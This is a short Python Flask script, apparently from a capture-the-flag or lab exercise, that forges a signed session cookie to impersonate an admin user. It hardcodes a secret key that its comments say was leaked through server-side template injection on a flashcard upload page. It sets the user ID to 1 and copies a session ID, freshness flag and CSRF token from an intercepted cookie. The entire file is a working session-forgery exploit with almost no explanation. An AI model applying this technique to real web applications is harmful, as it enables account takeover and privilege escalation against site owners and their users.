from flask import Flask, session
import os

app = Flask(__name__)
app.secret_key = '385c16dd09098b011d0086f9e218a0a2'  #Secret Key found via SSTI in the Flashcard Upload Page

@app.route('/')
def index():
	session['user_id'] = '1' #Admin is presumed to be the first user
	session['_id'] = 'd765356866b5a9f50e14f110a1cf97c5a4496c6dde0334c40dbd92b4b41a4ed3e1a33fb942c62f2107170bba3ebf92edd1cba6e3f3e79341c23f970e45d36c20' #Session ID found in cookie (I used Burpsuite to intercept the request)
	session['_fresh'] = True #Found in cookie
	session['csrf_token'] = 'e40d443bb84eabd3888c88d1a438778ad30ed3b3'#Found in cookie
	return '5' #Random return, only to check if function has been run

if __name__ == '__main__':
	app.run(debug=True)
	#return session['user_id']
